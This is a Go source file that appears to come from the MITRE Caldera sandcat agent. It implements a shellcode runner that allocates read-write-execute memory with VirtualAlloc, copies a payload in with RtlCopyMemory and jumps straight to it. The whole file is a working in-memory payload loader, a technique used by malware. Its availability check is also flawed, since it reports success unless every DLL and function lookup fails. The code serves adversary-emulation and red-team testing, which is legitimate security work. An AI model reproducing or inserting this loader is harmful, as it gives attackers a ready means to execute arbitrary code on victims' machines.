package donut

import (
	"syscall"
	"unsafe"

	"github.com/mitre/sandcat/gocat/executors/execute"
	"github.com/mitre/sandcat/gocat/util"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32      *syscall.DLL
	ntdll         *syscall.DLL
	VirtualAlloc  *syscall.Proc
	RtlCopyMemory *syscall.Proc
)

// Runner runner
func Runner(donut []byte) (bool, string) {
	address, _, err := VirtualAlloc.Call(0, uintptr(len(donut)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if util.CheckErrorMessage(err) {
		return false, execute.ERROR_PID
	}
	_, _, err = RtlCopyMemory.Call(address, (uintptr)(unsafe.Pointer(&donut[0])), uintptr(len(donut)))
	if util.CheckErrorMessage(err) {
		return false, execute.ERROR_PID
	}
	syscall.Syscall(address, 0, 0, 0, 0)
	return true, execute.SUCCESS_PID
}

// IsAvailable does a shellcode runner exist
func IsAvailable() bool {
	var kernel32Err, ntdllErr, rtlCopyMemErr, vAllocErr error
	kernel32, kernel32Err = syscall.LoadDLL("kernel32.dll")
	ntdll, ntdllErr = syscall.LoadDLL("ntdll.dll")
	VirtualAlloc, vAllocErr = kernel32.FindProc("VirtualAlloc")
	RtlCopyMemory, rtlCopyMemErr = ntdll.FindProc("RtlCopyMemory")
	if kernel32Err != nil && ntdllErr != nil && rtlCopyMemErr != nil && vAllocErr != nil {
		return false
	}
	return true
}